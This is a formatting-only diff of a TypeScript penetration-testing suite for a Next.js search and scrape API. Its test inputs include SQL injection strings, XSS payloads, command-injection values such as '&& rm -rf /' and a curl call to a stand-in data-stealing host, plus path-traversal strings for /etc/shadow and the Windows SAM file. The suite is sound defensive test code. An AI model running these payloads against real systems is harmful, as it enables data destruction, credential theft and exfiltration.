@@ -36,15 +36,15 @@ class PenetrationTester {
         vulnerabilityFound: !passed,
         severity,
         description,
-        recommendation: passed ? undefined : 'Review and fix the identified security issue'
+        recommendation: passed ? undefined : 'Review and fix the identified security issue',
       }
-      
+
       this.results.push(result)
-      
+
       if (!passed) {
         logger.warn('PenetrationTester', `Security vulnerability found: ${testName}`, result)
       }
-      
+
       return result
     } catch (error) {
       const result: SecurityTestResult = {
@@ -53,9 +53,9 @@ class PenetrationTester {
         vulnerabilityFound: true,
         severity: 'high',
         description: `Test failed with error: ${error}`,
-        recommendation: 'Investigate test failure and potential security implications'
+        recommendation: 'Investigate test failure and potential security implications',
       }
-      
+
       this.results.push(result)
       return result
     }
@@ -90,11 +90,15 @@ Vulnerabilities Found: ${vulnerabilities.length}
 - Medium: ${medium}
 - Low: ${low}
 
-${vulnerabilities.map(v => `
+${vulnerabilities
+  .map(
+    v => `
 ${v.testName} (${v.severity.toUpperCase()})
 ${v.description}
 ${v.recommendation ? `Recommendation: ${v.recommendation}` : ''}
-`).join('\n')}
+`
+  )
+  .join('\n')}
     `.trim()
   }
 }
@@ -106,7 +110,7 @@ const mockApiHandler = async (request: NextRequest, handler: Function) => {
   } catch (error) {
     return new Response(JSON.stringify({ error: 'Internal server error' }), {
       status: 500,
-      headers: { 'Content-Type': 'application/json' }
+      headers: { 'Content-Type': 'application/json' },
     })
   }
 }
@@ -128,7 +132,7 @@ describe('Penetration Testing Suite', () => {
             "'; DROP TABLE businesses; --",
             "1' OR '1'='1",
             "admin'--",
-            "1'; INSERT INTO users VALUES ('hacker', 'password'); --"
+            "1'; INSERT INTO users VALUES ('hacker', 'password'); --",
           ]
 
           // Test each malicious input
@@ -137,24 +141,26 @@ describe('Penetration Testing Suite', () => {
             const request = new NextRequest('http://localhost:3000/api/search', {
               method: 'POST',
               body: JSON.stringify({ query: input, zipCode: '12345' }),
-              headers: { 'Content-Type': 'application/json' }
+              headers: { 'Content-Type': 'application/json' },
             })
 
             // Mock the search API handler
             const response = await mockApiHandler(request, async (req: NextRequest) => {
               const body = await req.json()
-              
+
               // Check if input is properly sanitized
-              if (body.query.includes('DROP TABLE') || 
-                  body.query.includes('INSERT INTO') ||
-                  body.query.includes("'--") ||
-                  body.query.includes('1=1')) {
+              if (
+                body.query.includes('DROP TABLE') ||
+                body.query.includes('INSERT INTO') ||
+                body.query.includes("'--") ||
+                body.query.includes('1=1')
+              ) {
                 throw new Error('SQL injection attempt detected')
               }
-              
+
               return new Response(JSON.stringify({ results: [] }), {
                 status: 200,
-                headers: { 'Content-Type': 'application/json' }
+                headers: { 'Content-Type': 'application/json' },
               })
             })
 
@@ -163,7 +169,7 @@ describe('Penetration Testing Suite', () => {
               return false
             }
           }
-          
+
           return true
         },
         'critical',
@@ -182,19 +188,19 @@ describe('Penetration Testing Suite', () => {
             '<img src="x" onerror="alert(1)">',
             'javascript:alert("XSS")',
             '<svg onload="alert(1)">',
-            '"><script>alert("XSS")</script>'
+            '"><script>alert("XSS")</script>',
           ]
 
           for (const payload of xssPayloads) {
             const request = new NextRequest('http://localhost:3000/api/search', {
               method: 'POST',
               body: JSON.stringify({ query: payload, zipCode: '12345' }),
-              headers: { 'Content-Type': 'application/json' }
+              headers: { 'Content-Type': 'application/json' },
             })
 
             const response = await mockApiHandler(request, async (req: NextRequest) => {
               const body = await req.json()
-              
+
               // Check if XSS payload is properly escaped/sanitized
               const sanitized = body.query
                 .replace(/</g, '&lt;')
@@ -206,13 +212,13 @@ describe('Penetration Testing Suite', () => {
               if (sanitized !== body.query && body.query.includes('<script>')) {
                 return new Response(JSON.stringify({ error: 'Invalid input' }), {
                   status: 400,
-                  headers: { 'Content-Type': 'application/json' }
+                  headers: { 'Content-Type': 'application/json' },
                 })
               }
 
               return new Response(JSON.stringify({ results: [] }), {
                 status: 200,
-                headers: { 'Content-Type': 'application/json' }
+                headers: { 'Content-Type': 'application/json' },
               })
             })
 
@@ -244,38 +250,40 @@ describe('Penetration Testing Suite', () => {
             '&& rm -rf /',
             '`whoami`',
             '$(id)',
-            '; curl http://malicious.com/steal-data'
+            '; curl http://malicious.com/steal-data',
           ]
 
           for (const payload of commandInjectionPayloads) {
             const request = new NextRequest('http://localhost:3000/api/scrape', {
               method: 'POST',
-              body: JSON.stringify({ 
+              body: JSON.stringify({
                 action: 'scrape',
                 url: `https://example.com${payload}`,
-                depth: 1
+                depth: 1,
               }),
-              headers: { 'Content-Type': 'application/json' }
+              headers: { 'Content-Type': 'application/json' },
             })
 
             const response = await mockApiHandler(request, async (req: NextRequest) => {
               const body = await req.json()
-              
+
               // Check if URL contains command injection attempts
-              if (body.url.includes(';') || 
-                  body.url.includes('|') ||
-                  body.url.includes('&&') ||
-                  body.url.includes('`') ||
-                  body.url.includes('$(')) {
+              if (
+                body.url.includes(';') ||
+                body.url.includes('|') ||
+                body.url.includes('&&') ||
+                body.url.includes('`') ||
+                body.url.includes('$(')
+              ) {
                 return new Response(JSON.stringify({ error: 'Invalid URL format' }), {
                   status: 400,
-                  headers: { 'Content-Type': 'application/json' }
+                  headers: { 'Content-Type': 'application/json' },
                 })
               }
 
               return new Response(JSON.stringify({ businesses: [] }), {
                 status: 200,
-                headers: { 'Content-Type': 'application/json' }
+                headers: { 'Content-Type': 'application/json' },
               })
             })
 
@@ -301,21 +309,23 @@ describe('Penetration Testing Suite', () => {
         'rate-limiting-enforcement',
         async () => {
           const requests = []
-          
+
           // Simulate rapid requests
           for (let i = 0; i < 100; i++) {
             const request = new NextRequest('http://localhost:3000/api/search', {
               method: 'POST',
               body: JSON.stringify({ query: 'test', zipCode: '12345' }),
-              headers: { 'Content-Type': 'application/json' }
+              headers: { 'Content-Type': 'application/json' },
             })
 
-            requests.push(mockApiHandler(request, async () => {
-              return new Response(JSON.stringify({ results: [] }), {
-                status: 200,
-                headers: { 'Content-Type': 'application/json' }
+            requests.push(
+              mockApiHandler(request, async () => {
+                return new Response(JSON.stringify({ results: [] }), {
+                  status: 200,
+                  headers: { 'Content-Type': 'application/json' },
+                })
               })
-            }))
+            )
           }
 
           const responses = await Promise.all(requests)
@@ -339,10 +349,10 @@ describe('Penetration Testing Suite', () => {
         async () => {
           const request = new NextRequest('http://localhost:3000/api/search', {
             method: 'OPTIONS',
-            headers: { 
-              'Origin': 'http://malicious-site.com',
-              'Access-Control-Request-Method': 'POST'
-            }
+            headers: {
+              Origin: 'http://malicious-site.com',
+              'Access-Control-Request-Method': 'POST',
+            },
           })
 
           const response = await mockApiHandler(request, async () => {
@@ -351,13 +361,13 @@ describe('Penetration Testing Suite', () => {
               headers: {
                 'Access-Control-Allow-Origin': 'http://localhost:3000',
                 'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-                'Access-Control-Allow-Headers': 'Content-Type'
-              }
+                'Access-Control-Allow-Headers': 'Content-Type',
+              },
             })
           })
 
           const allowOrigin = response.headers.get('Access-Control-Allow-Origin')
-          
+
           // Should not allow arbitrary origins
           return allowOrigin !== '*' && allowOrigin !== 'http://malicious-site.com'
         },
@@ -377,19 +387,23 @@ describe('Penetration Testing Suite', () => {
           const request = new NextRequest('http://localhost:3000/api/search', {
             method: 'POST',
             body: JSON.stringify({ invalid: 'data' }),
-            headers: { 'Content-Type': 'application/json' }
+            headers: { 'Content-Type': 'application/json' },
           })
 
           const response = await mockApiHandler(request, async () => {
-            throw new Error('Database connection failed: postgresql://user:password@localhost:5432/db')
+            throw new Error(
+              'Database connection failed: postgresql://user:password@localhost:5432/db'
+            )
           })
 
           const errorText = await response.text()
-          
+
           // Should not expose sensitive information in error messages
-          return !errorText.includes('password') && 
-                 !errorText.includes('postgresql://') &&
-                 !errorText.includes('localhost:5432')
+          return (
+            !errorText.includes('password') &&
+            !errorText.includes('postgresql://') &&
+            !errorText.includes('localhost:5432')
+          )
         },
         'high',
         'Tests that error messages do not expose sensitive system information'
@@ -407,7 +421,7 @@ describe('Penetration Testing Suite', () => {
             '..\\..\\..\\windows\\system32\\config\\sam',
             '/etc/shadow',
             'C:\\Windows\\System32\\drivers\\etc\\hosts',
-            '....//....//....//etc/passwd'
+            '....//....//....//etc/passwd',
           ]
 
           for (const path of maliciousPaths) {
@@ -417,9 +431,11 @@ describe('Penetration Testing Suite', () => {
               .replace(/[\\\/]/g, '/') // Normalize slashes
               .replace(/\/+/g, '/') // Remove multiple slashes
 
-            if (normalizedPath.includes('/etc/') || 
-                normalizedPath.includes('/windows/') ||
-                normalizedPath.includes('system32')) {
+            if (
+              normalizedPath.includes('/etc/') ||
+              normalizedPath.includes('/windows/') ||
+              normalizedPath.includes('system32')
+            ) {
               return false
             }
           }
@@ -459,7 +475,7 @@ describe('Penetration Testing Suite', () => {
       logger.info('PenetrationTester', 'Security test report generated', {
         totalTests: penetrationTester.getResults().length,
         vulnerabilities: vulnerabilities.length,
-        criticalVulnerabilities: criticalVulns.length
+        criticalVulnerabilities: criticalVulns.length,
       })
 
       // Fail if critical vulnerabilities are found
